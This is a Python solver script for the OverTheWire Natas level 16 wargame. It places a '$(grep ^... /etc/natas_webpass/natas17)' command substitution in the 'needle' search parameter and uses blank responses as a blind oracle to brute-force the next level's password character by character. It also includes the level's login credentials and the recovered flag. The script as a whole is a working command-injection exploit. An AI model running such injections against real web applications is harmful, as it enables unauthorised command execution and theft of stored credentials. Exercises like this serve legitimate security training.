import requests, string
 
possibleCharacters = list(map(chr, range(97, 123))) + list(map(chr, range(65, 91))) + list(map(chr, range(48, 58)))
resultFlag = "" #Resulting Flag was: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
characterCounter = 0
while(len(resultFlag) < 32):

    
    current_challenge = resultFlag + possibleCharacters[characterCounter]
    needle = f"$(grep ^{current_challenge} /etc/natas_webpass/natas17)"
    print("Testing: " + current_challenge)
    url = f"http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/?needle={needle}&submit=Search"
    resp = requests.get(url)
    #print(resp.text)
    if("Input contains an illegal character!" in resp.text):
        print("Illegal character: " + current_challenge)
        break
    if("<pre>" in resp.text):
        matches = resp.text.split("<pre>")[1]
        matches = matches.split("</pre>")[0].strip()
        
        if(not matches):
            print("match!")
            resultFlag = current_challenge
            characterCounter = 0
        else:
            characterCounter +=1 
            

print("Flag: " + resultFlag)
